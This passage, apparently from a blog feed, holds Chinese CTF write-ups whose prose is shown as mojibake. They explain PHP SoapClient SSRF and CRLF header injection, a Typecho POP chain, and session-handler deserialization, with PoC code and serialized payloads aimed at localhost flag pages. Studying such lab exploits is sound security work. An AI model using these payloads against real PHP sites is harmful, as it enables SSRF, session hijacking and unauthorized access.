alt></p><p>æœä¸å…¶ç„¶æœ‰ä¸ª<code>call_user_func</code>ã€‚è€Œä¸”å‚æ•°éƒ½å¯æ§ï¼Œé“¾å­ç»“æŸã€‚æ‰€ä»¥å…¶å®å°±æ˜¯ä¸ªåŸé¢˜é­”æ”¹äº†ä¸‹ã€‚å½“æ—¶çœ‹åˆ°è¿™å°±æ²¡åšäº†ã€‚</p><p>ç„¶è€Œäº‹æƒ…æ²¡è¿™ä¹ˆç®€å•ã€‚åæ¥å‘ç°ä¸€ä¸ªé—®é¢˜ã€‚é‚£å°±æ˜¯LCTFå¯ä»¥åˆ©ç”¨sessionå¤„ç†å™¨å°†Soapçš„åºåˆ—åŒ–æ•°æ®å†™åˆ°sessioné‡Œï¼Œç„¶å<code>call_user_func</code>è§¦å‘ã€‚è¿™é‡Œå´ä¸è¡Œã€‚é‚£å°±éœ€è¦æŠŠé“¾å­å†å¤šæŒ–ä¸€ä¸‹.</p><p>æ³¨æ„åˆ°ä¹‹å‰çš„ç»“å°¾æç¤ºæˆ‘ä»¬<code>__toString()</code>ã€‚å…¨å±€æœç´¢ä¸‹toStringï¼Œè·Ÿåˆ°\var\Typecho\Db\Query.phpä¸‹ã€‚<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æ³¨æ„åˆ°è¿™é‡Œï¼Œ<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>æ—¶æ‰§è¡Œäº†<code>_adapter</code>çš„<code>parseSelect()</code>æ–¹æ³•ã€‚åº”è¯¥å¯ä»¥æ»¡è¶³æˆ‘ä»¬è§¦å‘Soapçš„æ¡ä»¶ï¼Œå³è°ƒç”¨ä¸å­˜åœ¨æ–¹æ³•ã€‚<br>æ¢³ç†å®Œé‡ç‚¹åå¼€å§‹æ„é€ äº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$db &#x3D; new Typecho_Db($this-&gt;coincidence[&#39;hello&#39;], $this-&gt;coincidence[&#39;world&#39;]);</span><br><span class="line">&#x3D;&gt;call_user_func(array($adapterName, &#39;isAvailable&#39;))</span><br><span class="line">    &#x3D;&gt; __toString()&#x2F;&#x2F;Typecho_Db_Query</span><br><span class="line">      &#x3D;&gt; $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild)</span><br></pre></td></tr></table></figure><p>åªç”¨åˆ°ä¸¤ä¸ªç±»,popé“¾ä¸é•¿ï¼ˆhhhï¼‰<br>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'X-Forwarded-For:127.0.0.1'</span>,</span><br><span class="line">            <span class="string">"Cookie: PHPSESSID=b92shmac496iqkek97vkuetnn0"</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'uri'</span> =&gt; <span class="string">'abc'</span>, <span class="string">'location'</span> =&gt; $target, <span class="string">'user_agent'</span> =&gt; <span class="string">'byc404^^'</span> . join(<span class="string">'^^'</span>, $headers)));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild = [<span class="string">'action'</span> =&gt; <span class="string">"SELECT"</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence = <span class="keyword">array</span>(<span class="string">"hello"</span> =&gt; <span class="keyword">new</span> Typecho_Db_Query());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$poc = serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line">$poc = preg_replace(<span class="string">" /\^\^/"</span>, <span class="string">"\r\n"</span>, $poc);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($poc);</span><br></pre></td></tr></table></figure><p>ç„¶åè§¦å‘çš„åœ°æ–¹æ²¡æ‰¾åˆ°â€¦â€¦åŸæ¥åœ¨/var/Typeecho/Plugin.phpé‡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span><span class="params">($pluginName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">self</span>::$_plugins[<span class="string">'activated'</span>][$pluginName] = <span class="keyword">self</span>::$_tmp;</span><br><span class="line">    <span class="keyword">self</span>::$_tmp = <span class="keyword">array</span>();</span><br><span class="line">    Helper::addRoute(<span class="string">"page_admin_action"</span>,<span class="string">"/page_admin"</span>,<span class="string">"HelloWorld_Plugin"</span>,<span class="string">'action'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå°±å°è¯•æäº¤pocã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post: C0incid3nc3&#x3D;TzoxMzoiSGVsbG9Xb3JsZF9EQiI6MTp7czoyNjoiAEhlbGxvV29ybGRfREIAY29pbmNpZGVuY2UiO2E6MTp7czo1OiJoZWxsbyI7TzoxNjoiVHlwZWNob19EYl9RdWVyeSI6Mjp7czoyNjoiAFR5cGVjaG9fRGJfUXVlcnkAX2FkYXB0ZXIiO086MTA6IlNvYXBDbGllbnQiOjU6e3M6MzoidXJpIjtzOjM6ImFiYyI7czo4OiJsb2NhdGlvbiI7czoyNToiaHR0cDovLzEyNy4wLjAuMS9mbGFnLnBocCI7czoxNToiX3N0cmVhbV9jb250ZXh0IjtpOjA7czoxMToiX3VzZXJfYWdlbnQiO3M6Nzk6ImJ5YzQwNA0KWC1Gb3J3YXJkZWQtRm9yOjEyNy4wLjAuMQ0KQ29va2llOiBQSFBTRVNTSUQ9bW9pODU2cXVxcHU2bXV2bWhnYTdrbzdwNTMiO3M6MTM6Il9zb2FwX3ZlcnNpb24iO2k6MTt9czozMDoiAFR5cGVjaG9fRGJfUXVlcnkAX3NxbFByZUJ1aWxkIjthOjE6e3M6NjoiYWN0aW9uIjtzOjY6IlNFTEVDVCI7fX19fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>ç„¶å<code>?admin=1</code>è®¿é—®å³å¯ã€‚<br>ç„¶ååº”è¯¥æ˜¯è·ŸLCTFä¸€æ ·ï¼Œæœ€å¥½payloadè·Ÿæ£€æŸ¥flagçš„PHPSESSIDä¸è¦ç”¨åŒä¸€ä¸ªã€‚æˆ‘çœ‹Nepnepå¸ˆå‚…ä»¬çš„wpé‡Œè¯´ç›´æ¥ç”Ÿæˆçš„payloadè¿‡ä¸å»ã€‚æˆ‘åæ­£??????äººå®¶ç‰¹æ„è®¾å®šçš„base64encodeæ ¹æœ¬ä¸å­˜åœ¨privateç‰¹æ®Šå­—ç¬¦è¿‡ä¸å»çš„é—®é¢˜å•Šã€‚åæ­£æˆ‘æ˜¯å¯ä»¥ç›´æ¥æ‰“çš„,åº”è¯¥æ²¡å•¥é—®é¢˜ã€‚<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¤§æ¦‚è¿™ä¹ˆå¤šï¼Œé¢˜ç›®æ¯•ç«Ÿæ–°æ‰‹é¢˜ã€‚æ”¶è·è°ˆä¸ä¸Šï¼Œæ²¡æ‰é“¾å­å°±ç®—æ»¡æ„äº†ã€‚æœ€åä¸€é¢˜ä¹Ÿæé†’äº†è‡ªå·±æ‹’ç»æƒ³å½“ç„¶ï¼Œé“¾å­æ²¡å†™å‡ºæ¥å°±ä¸èƒ½ç©ºæƒ³ï¼Œå®åœ¨çš„pocæ‰æ˜¯ç‹é“ã€‚è¿‡å‡ å¤©æŠŠå¹½çµçŒ«çš„æ€»ç»“ä¸‹ã€‚æ¯•ç«Ÿå›½é™…èµ›ä¸Šä¹Ÿé‡åˆ°äº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨Soapçš„ssrf/crlfæ”»å‡»</title>
      <link href="2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/"/>
      <url>2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>è¿™å‡ å¤©åœ¨buuä¸Šç–¯ç‹‚åˆ·é¢˜ã€‚çªç„¶æ¥è§¦åˆ°äº†ä¸€ä¸ªä¹‹å‰æ²¡æœ‰æ³¨æ„è¿‡çš„çŸ¥è¯†ç‚¹ã€‚é‚£å°±æ˜¯ä½¿ç”¨Soapè¿›è¡Œssrfã€‚ç›®å‰åšåˆ°çš„å‡ é“é¢˜ä¸ªäººè§‰å¾—è¿˜æ˜¯éå¸¸æœ‰è¥å…»çš„ã€‚é‚£ä¹ˆå¹²è„†æ€»ç»“ä¸‹å…³äºphp+Soapçš„ç›¸å…³çŸ¥è¯†ã€‚</p><a id="more"></a><h1 id="Soap"><a href="#Soap" class="headerlink" title="Soap"></a>Soap</h1><p>SOAPæ˜¯webServiceä¸‰è¦ç´ ï¼ˆSOAPã€WSDLã€UDDIï¼‰ä¹‹ä¸€ï¼š</p><ul><li><p>WSDL ç”¨æ¥æè¿°å¦‚ä½•è®¿é—®å…·ä½“çš„æ¥å£ã€‚</p></li><li><p>UDDIç”¨æ¥ç®¡ç†ï¼Œåˆ†å‘ï¼ŒæŸ¥è¯¢webServiceã€‚</p></li><li><p>SOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®åè®®ï¼‰æ˜¯è¿æ¥æˆ–WebæœåŠ¡æˆ–å®¢æˆ·ç«¯å’ŒWebæœåŠ¡ä¹‹é—´çš„æ¥å£ã€‚<br>å…¶é‡‡ç”¨HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ã€‚</p></li></ul><h1 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h1><p>PHP çš„ SOAP æ‰©å±•å¯ä»¥ç”¨æ¥æä¾›å’Œä½¿ç”¨ Web Services<br>è¿™ä¸ªæ‰©å±•å®ç°äº†6ä¸ªç±»ã€‚å…¶ä¸­æœ‰ä¸‰ä¸ªé«˜çº§çš„ç±»ï¼š SoapClientã€SoapServer å’ŒSoapFaultï¼Œ<br>å’Œä¸‰ä¸ªä½çº§ç±»ï¼Œå®ƒä»¬æ˜¯ SoapHeaderã€SoapParam å’Œ SoapVarã€‚<br>å…¶æ„é€ æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: SoapClient ï¼ˆmixed $wsdl [ï¼Œ<span class="keyword">array</span> $options ]ï¼‰</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ã€‚é€šå¸¸æˆ‘ä»¬æ„é€ æ—¶è®¾ä¸ºnullå³å¯ã€‚</p><p>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚</p><p>è¿™é‡Œæœ‰è¶£çš„åœ°æ–¹å°±åœ¨äºä¸¤ç‚¹</p><ul><li>SoapClientæ˜¯phpçš„åŸç”Ÿç±»ã€‚ä¸”å®ƒæœ‰ä¸€ä¸ª<code>__call()</code>é­”æœ¯æ–¹æ³•</li><li>SoapClientçš„ç¬¬äºŒä¸ªå‚æ•°å…è®¸æˆ‘ä»¬è‡ªå®šä¹‰User-Agent</li></ul><p>æ¥ä¾æ¬¡è§£é‡Šä¸‹è¿™ä¸¤ä¸ªæœ‰è¶£ä¹‹å¤„<br>1.åŸç”Ÿç±»è¯´æ˜æˆ‘ä»¬ä¸éœ€è¦åˆ»æ„å»å¯»æ‰¾php POPChainä¸­çš„åˆ©ç”¨ç‚¹ã€‚å› ä¸ºSoapå·²ç»æä¾›ç»™æˆ‘ä»¬ä¸€ä¸ªç°æˆçš„é­”æœ¯æ–¹æ³•ã€‚è€Œåªè¦ç”¨Soap,æˆ‘ä»¬å°±å¯ä»¥è¾¾æˆssrfï¼Œå¯ä»¥æ‰“å†…ç½‘.</p><p>2.User-Agentå¯è‡ªå®šä¹‰å¸¦æ¥çš„æ˜¯CRLFæ³¨å…¥çš„å¯èƒ½ã€‚ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´ï¼Ÿå› ä¸ºhttp headeré‡Œæœ‰ä¸€ä¸ªé‡è¦çš„Content-Typeä¸ºå’ŒContent-Lengthã€‚<br>è€ŒUser-Agentçš„http headerä½ç½®æ­£å¥½åœ¨è¿™äº›ä¹‹ä¸Šï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œè¦†ç›–ã€‚å¯¹äºContent-Typeï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦åˆ©ç”¨CRLFå‘é€postè¯·æ±‚ï¼Œé‚£ä¹ˆè¦æ±‚å®ƒä¸ºapplication/x-www-form-urlencode<br>é‚£ä¹ˆæ­¤æ—¶å°±å¯ä»¥åˆ©ç”¨CRLFï¼Œæ„é€ å¦‚ä¸‹payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$payload &#x3D; new SoapClient(null,array(&#39;user_agent&#39;&#x3D;&gt;&quot;test\r\nCookie: PHPSESSID&#x3D;08jl0ttu86a5jgda8cnhjtvq32\r\n</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded\r\nContent-Length:45\r\n\r\n</span><br><span class="line">username&#x3D;admin&amp;password&#x3D;nu1ladmin&amp;code&#x3D;470837\r\n\r\n\r\n&quot;,</span><br><span class="line">&#39;location&#39;&#x3D;&gt;$location,</span><br><span class="line">&#39;uri&#39;&#x3D;&gt;$uri));</span><br></pre></td></tr></table></figure><p>CRLFä¸SSRFï¼Œè¿™ä¸¤ä¸ªæ¼æ´éƒ½å¯ä»¥é€šè¿‡SoapClientè¾¾æˆã€‚</p><h1 id="çœŸé¢˜"><a href="#çœŸé¢˜" class="headerlink" title="çœŸé¢˜"></a>çœŸé¢˜</h1><p>å¹²è¯´é“ç†æ˜¯ä¸å¤Ÿçš„ï¼Œè¿™é‡Œç›´æ¥æŠŠå‡ å¤©æ¥åšåˆ°çš„çœŸé¢˜åˆ†æä¸‹ã€‚</p><p> è¸©å‘ï¼š windowsä¸‹å¼€å¯SoapClient:<br>SoapClientç”¨åˆ°çš„æ˜¯phpæ‰©å±•ï¼Œéœ€è¦åœ¨php.iniå¯ç”¨ä¸‰ä¸ªåŠ¨æ€é“¾æ¥åº“</p><ul><li>php_soap.dll</li><li>php_openssl.dll</li><li>php_curl.dll                     </li></ul><p>è¿™é‡Œæˆ‘çš„iniæ–‡æœ¬ä¸­å¼€å§‹åªæ‰¾åˆ°ä¸€ä¸ªæœªå¯ç”¨çš„åº“<code>;extension=php_curl.dll</code>ï¼Œä½†æ˜¯å®é™…ä¸Šåœ¨phpçš„æ–‡ä»¶å¤¹çš„exté‡Œåº”è¯¥æ˜¯å¯ä»¥å…¨éƒ¨æ‰¾åˆ°çš„ã€‚æ‰€ä»¥éœ€è¦æŠŠè¿™ä¸‰ä¸ªæ–‡ä»¶åéƒ½å¯ç”¨ï¼ˆå³å»æ‰å¼€å¤´åˆ†å·ï¼‰ï¼Œå¹¶ä»¤å…¶ç­‰äºå¯¹åº”çš„æ‰©å±•è·¯å¾„ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨SoapClientäº†ã€‚</p><p>Linuxå®‰è£…ä¸€æŠŠæ¢­å°±å¥½ï¼Œä¸å¿…å¤šè¯´ã€‚</p><h2 id="bestphpâ€™s-revenge"><a href="#bestphpâ€™s-revenge" class="headerlink" title="bestphpâ€™s revenge"></a>bestphpâ€™s revenge</h2><p>é¢˜ç›®æºç <br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'f'</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®æœ‰å‡ ä¸ªé‡ç‚¹ï¼Œæˆ‘ä»¬å…ˆä»ç»“æœçœ‹èµ·ã€‚<br>flagåœ¨flag.phpä¸­ï¼Œæƒ³è¦è¯»åˆ°flagï¼Œå¿…ç„¶éœ€è¦ä»127.0.0.1è®¿é—®ï¼Œç„¶åflagä¼šè¢«ä¿å­˜åœ¨sessionå€¼ä¸­ã€‚æ˜¾ç„¶æ˜¯ä¸ªssrfäº†ã€‚é‚£ä¹ˆæˆ‘ä»¬çœ‹çœ‹index.phpä¸­çš„ä»£ç <br><code>var_dump($_SESSION);</code><br>é¦–å…ˆç¡®è®¤sessionçš„å€¼ä¼šè¢«æ‰“å°å‡ºæ¥ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œé‚£çœ‹æ¥æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯ssrfäº†ã€‚å†æ¥çœ‹çœ‹å…¶ä»–å‡½æ•°éœ€è¦æ€ä¹ˆåˆ©ç”¨ã€‚<br>å¾ˆå”çªçš„ä¸€ä¸ª<code>$b = &#39;implode&#39;;</code>+<code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>ä»¥åŠæœ€åä¸€ä¸ª<code>call_user_func($b, $a);</code><br>è¿™é‡Œbç´§æ¥ç€ä¸€ä¸ª<code>call_user_func</code>çœ‹æ¥æ˜¯å¯ä»¥å˜é‡è¦†ç›–äº†ã€‚<br>é‚£ä¹ˆå¦‚æœè¦†ç›–äº†çš„è¯ï¼Œè¦†ç›–æˆä»€ä¹ˆï¼Œåˆæ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿ<br>è¿™é‡Œéœ€è¦çŸ¥é“ä¸€ç‚¹ï¼š</p><ul><li>call_user_func()å‡½æ•°å¦‚æœä¼ å…¥çš„å‚æ•°æ˜¯arrayç±»å‹çš„è¯ï¼Œä¼šå°†æ•°ç»„çš„æˆå‘˜å½“åšç±»åå’Œæ–¹æ³•</li></ul><p>â€˜å‡å¦‚æˆ‘ä»¬ä¸€å¼€å§‹åˆ©ç”¨få°†bè¦†ç›–æˆ <code>call_user_func()</code>ï¼Œé‚£ä¹ˆåœ¨index.phpçš„æœ€åï¼Œå‡½æ•°å°†æ‰§è¡Œ<br><code>calluserfunc(calluserfunc,array($_session,â€˜welcome_to_the_lctf2018â€™))</code><br>ç”±äº<code>$_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];</code>å¯æ§ï¼Œå¦‚æœä»¤name=SoapClientï¼Œä¸å°±æˆäº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</span><br></pre></td></tr></table></figure><p>å—ï¼Ÿ<br>å‰é¢æåˆ°ï¼Œå¦‚æœSoapClientå­˜åœ¨<code>__call()</code>é­”æœ¯æ–¹æ³•ï¼Œè°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•å°†ç›´æ¥è§¦å‘æˆ‘ä»¬æ‰€éœ€è¦çš„ssrf.<br>é‚£ä¹ˆæ•´ä¸ªæµç¨‹çš„æœ€åä¸€æ­¥å¯ä»¥å…ˆè¡Œæ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">    <span class="string">'user_agent'</span> =&gt; <span class="string">"byc\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n"</span>,</span><br><span class="line">    <span class="string">'uri'</span> =&gt; <span class="string">"123"</span>));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line"><span class="keyword">echo</span> $payload;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œè¿˜ç”¨åˆ°äº†æˆ‘ä»¬ä¸Šé¢æåˆ°çš„CRLFæ¼æ´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;user_agent&#39; &#x3D;&gt; &quot;byc\r\nCookie: PHPSESSID&#x3D;g6ooseaeo905j0q4b9qqn2n471\r\n&quot;,</span><br></pre></td></tr></table></figure><p>çœ‹ï¼Œåªè¦\r\nï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶è®¿é—®æ—¶çš„Cookie,è¿™æ ·æœ€åç”Ÿæ•ˆçš„flagä¹Ÿä¼šè¢«ä¿å­˜åœ¨æˆ‘ä»¬å¯æ§çš„cookieä¸­</p><p>ä¸‹é¢è¦æ€è€ƒçš„å°±æ˜¯ï¼Œæ€ä¹ˆè§¦å‘ååºåˆ—åŒ–å‘¢ï¼Ÿè”ç³»åˆ°é¢˜ç›®ä¸­æ•æ„Ÿçš„sessionå­˜å‚¨ï¼Œè‡ªç„¶å¯ä»¥è”æƒ³åˆ°æŸä¸ªä¸ç”¨<code>unserialize</code>ä¹Ÿèƒ½è§¦å‘çš„ååºåˆ—åŒ–æ¼æ´ï¼šphpsessionå¤„ç†å™¨å¼•æ“ä¸ä¸€è‡´å¯¼è‡´çš„ååºåˆ—åŒ–ã€‚<br>é‚£ä¹ˆé—®é¢˜å°±è§£å†³äº†ï¼šæˆ‘ä»¬åœ¨æœ€å¼€å§‹å°±ä»¤å¼•æ“ä¸º<code>php_serialize</code>ï¼Œå¹¶å°†åºåˆ—åŒ–æ•°æ®å­˜å‚¨åˆ°sessionä¸­ã€‚ç„¶ååœ¨ç¬¬äºŒæ¬¡æ‰è¿›è¡Œssrfã€‚æ­¤æ—¶ç”±äºå¤„ç†å™¨é‡æ–°å˜å›phpï¼Œå°†è§¦å‘ååºåˆ—åŒ–ï¼Œä»è€Œè§¦å‘ssrfï¼Œå°†flagå­˜å‚¨åœ¨å¯æ§cookieä¸­ã€‚æœ€åæ¢cookieè®¿é—®å³å¯ã€‚<br>pocï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.f&#x3D;session_start&amp;name&#x3D;|O%3A10%3A%22SoapClient%22%3A5......</span><br><span class="line">åŒæ—¶post serizliaze_handler&#x3D;php_serialize</span><br><span class="line">è¿™æ ·æ‰§è¡Œçš„å°±æ˜¯session_start(&quot;serialize_handler&quot;:&#39;php_serialize&#39;)</span><br><span class="line">æˆ‘ä»¬çš„æ•°æ®è¢«æˆåŠŸå†™å…¥session</span><br><span class="line"></span><br><span class="line">2.f&#x3D;extract&amp;name&#x3D;SoapClient</span><br><span class="line">åŒæ—¶post b&#x3D;calluserfunc</span><br><span class="line">è¿™æ ·æ‰§è¡Œçš„å°±æ˜¯calluserfunc(calluserfunc,array($_session,â€˜welcome_to_the_lctf2018â€™))</span><br></pre></td></tr></table></figure><p>æœ€åæ¢cookieè®¿é—®index.phpå°±èƒ½æ‹¿åˆ°flagäº†ã€‚</p><h2 id="De1CTF-shellshellshell"><a href="#De1CTF-shellshellshell" class="headerlink" title="De1CTF shellshellshell"></a>De1CTF shellshellshell</h2><p>è¶…çº§éº»çƒ¦çš„ä¸€é“é¢˜â€¦â€¦<br>å¯èƒ½æ˜¯å› 